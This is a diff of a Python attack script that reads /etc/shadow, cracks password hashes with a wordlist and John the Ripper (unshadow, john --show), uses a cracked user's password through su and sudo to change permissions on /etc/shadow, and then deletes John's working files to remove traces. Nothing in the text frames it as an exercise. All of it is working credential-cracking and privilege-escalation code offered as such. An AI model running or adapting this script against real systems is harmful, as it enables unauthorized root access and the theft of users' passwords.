@@ -1,10 +1,11 @@
 import crypt
 import subprocess
+import gzip
 
 with open ("/etc/shadow") as f:
 	my_input = f.readlines()
 
-with open ("dictionary.txt") as d:
+with open ("/usr/share/john/password.lst") as d:
 	my_dict = d.read()
 
 def findWord(dict,passW):
@@ -38,10 +39,9 @@ print(sys_admin_password)
 #set premission
 temp = f"su {bossName} -c \"echo {boss_password} | sudo -S chmod 640 /etc/shadow\""
 myOutput2 = subprocess.run(temp, stdout = subprocess.PIPE, universal_newlines = True, input = boss_password , stderr=subprocess.STDOUT, shell = True)
-#print (myOutput2)
-#print(temp)
 
-
+#John the ripper 
+subprocess.run("unshadow /etc/passwd /etc/shadow > /root/johns_passwd", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True)
 subprocess.run("john --wordlist=/usr/share/john/password.lst /root/johns_passwd", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True)
 myOutPut = (subprocess.run("john --show /root/johns_passwd", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True))
 splited = (str(myOutPut).split(":"))
@@ -51,5 +51,5 @@ for x in range(len(splited)):
 		break
 
 
-subprocess.run("rm -r /root.john", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True)
-subprocess.run("rm /root.johns_passwd", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True)
+subprocess.run("rm -r /root/.john", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True)
+subprocess.run("rm /root/johns_passwd", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True)
